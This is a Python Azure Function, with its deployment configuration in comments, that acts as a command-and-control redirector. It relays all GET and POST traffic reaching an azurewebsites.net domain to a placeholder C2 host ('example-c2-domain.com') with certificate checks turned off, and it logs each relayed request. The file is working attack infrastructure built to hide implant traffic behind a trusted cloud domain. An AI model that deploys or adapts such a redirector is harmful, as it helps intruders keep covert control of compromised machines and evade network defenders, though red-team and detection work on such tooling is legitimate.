import logging
import azure.functions as func

import requests
from urllib.parse import urlparse
from datetime import datetime

# Azure functions have a default HTTP route of http://<APP_NAME>/azurewebsites.net/api/<FUNCTION_NAME>
# We want to change this HTTP route to accept *all* routes hitting our *.azurewebsites.net domain since we
# need to pass along the requested URI to the backend host. In order to change these default settings,
# We need to change the ../host.json and ./function.json files.
# In host.json, specify "routePrefix": "" to remove the /api/
# and in function.json, specify "route": "{*path}" to allow wildcard routing.

# Follow the instructions here to set up a new Azure Function. Azure Function setup is a lot more involved than AWS Lambda.
# https://docs.microsoft.com/en-us/azure/azure-functions/create-first-function-cli-python?tabs=azure-cli%2Cbash%2Cbrowser

# Required configuration files are listed below in full you can paste into the correct spots when
# you deploy your Azure Function.

## $ cat requirements.txt
# #Do not include azure-functions-worker as it may conflict with the Azure Functions platform
# azure-functions
# requests

## $ cat host.json
# {
#   "version": "2.0",
#   "extensions": {
#     "http": {
#       "routePrefix": ""
#     }
#   },
#   "logging": {
#     "applicationInsights": {
#       "samplingSettings": {
#         "isEnabled": true,
#         "excludedTypes": "Request"
#       }
#     }
#   },
#   "extensionBundle": {
#     "id": "Microsoft.Azure.Functions.ExtensionBundle",
#     "version": "[2.*, 3.0.0)"
#   }
# }

## $ cat br-redirector/function.json
# {
#   "scriptFile": "__init__.py",
#   "bindings": [
#     {
#       "authLevel": "Anonymous",
#       "route": "{*path}",
#       "type": "httpTrigger",
#       "direction": "in",
#       "name": "req",
#       "methods": [
#         "get",
#         "post"
#       ]
#     },
#     {
#       "type": "http",
#       "direction": "out",
#       "name": "$return"
#     }
#   ]
# }

# Change this backend host to whatever your domain is
backend_host = "https://example-c2-domain.com"

def main(req: func.HttpRequest) -> func.HttpResponse:
    urlparsed = urlparse(req.url)
    uri = urlparsed.path

    if(req.method == "GET"):
        if(urlparsed.query != ""):
            uri = uri + "?" + urlparsed.query
        url = backend_host + uri
        response = requests.get(url, verify=False)

    elif(req.method == "POST"):
        url = backend_host + uri
        print(url)
        print(req.get_body())
        response = requests.post(url, data=req.get_body(), verify=False)

    print("[" + datetime.now().strftime("%b %d %Y %H:%M:%S") + "] Sent " + req.method + " request to " + url)

    return func.HttpResponse(
         body=response.content,
         headers=response.headers,
         status_code=200
    )
